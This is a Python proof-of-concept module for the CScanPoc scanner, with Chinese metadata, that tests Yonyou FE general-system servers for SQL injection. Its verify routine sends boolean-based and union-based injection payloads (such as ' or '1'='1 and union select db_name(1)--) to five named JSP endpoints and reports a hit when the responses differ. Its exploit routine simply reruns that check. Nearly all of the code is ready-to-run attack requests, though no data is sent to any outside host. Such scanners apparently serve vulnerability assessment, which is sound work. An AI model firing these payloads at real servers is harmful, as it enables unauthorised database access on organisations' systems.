# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0012'  # 平台漏洞编号，留空
    name = '用友FE通用系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-09'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友FE通用系统SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6c5d9e44-8b4e-454c-be1c-608617d915c1'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            url1 = '/permissionsreport/pMonitor.jsp?photoId=1&modelid=-1%27%20or%20%271%27=%271'
            url2 = '/permissionsreport/pMonitor.jsp?photoId=1&modelid=-1%27%20or%20%271%27=%272'
            code1, head, res1, errcode, _ = hh.http(self.target + url1)
            code2, head, res2, errcode, _ = hh.http(self.target + url2)
            m1 = re.search('nodes', res1)
            m2 = re.search('nodes', res2)
            url = self.target + '/permissionsreport/pMonitor.jsp?photoId=1&modelid='
            if code1 == 200 and code2 == 200 and m1 and m2 == None:
                # security_hole(self.target+'permissionsreport/pMonitor.jsp?photoId=1&modelid=1')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            url3 = '/sys/plugin/plugin_form_edit.jsp?done=&key=c%27union%20select%201,db_name(1)--'
            url = self.target + url3
            code3, head, res3, errcode, _ = hh.http(url)
            if code3 == 200 and "master" in res3:
                # security_hole(self.target+'sys/plugin/plugin_form_edit.jsp?done=&key=a')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            url4 = '/sys/left.jsp?lx=-1%27%20or%20%271%27=%271'
            url5 = '/sys/left.jsp?lx=-1%27%20or%20%271%27=%272'
            code4, head, res4, errcode, _ = hh.http(self.target + url4)
            code5, head, res5, errcode, _ = hh.http(self.target + url5)
            m3 = re.search("/images/ICON/Txt2.png", res4)
            m4 = re.search("/images/ICON/Txt2.png", res5)
            url = self.target + '/sys/left.jsp?lx='
            if code4 == 200 and code5 == 200 and m3 and m4 == None:
                #security_hole(self.target+'sys/left.jsp?lx=1'+':found sql injection!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            url6 = '/sys/plugin/plugin_datasource_edit.jsp?done=&key=-1%27%20union%20all%20%20select%20db_name(1),2--'
            url = self.target + url6
            code6, head, res6, errcode, _ = hh.http(url)
            if code6 == 200 and 'master' in res6:
                # security_hole(self.target+'sys/plugin/plugin_datasource_edit.jsp?done=&key=a')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            url7 = '/cooperate/flow/selectMUDR.jsp?id=1)'
            url = self.target + url7
            code7, head, res7, errcode, _ = hh.http(url)
            if 'bad SQL grammar [];' in res7:
                # security_hole(self.target+'cooperate/flow/selectMUDR.jsp?id=1')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
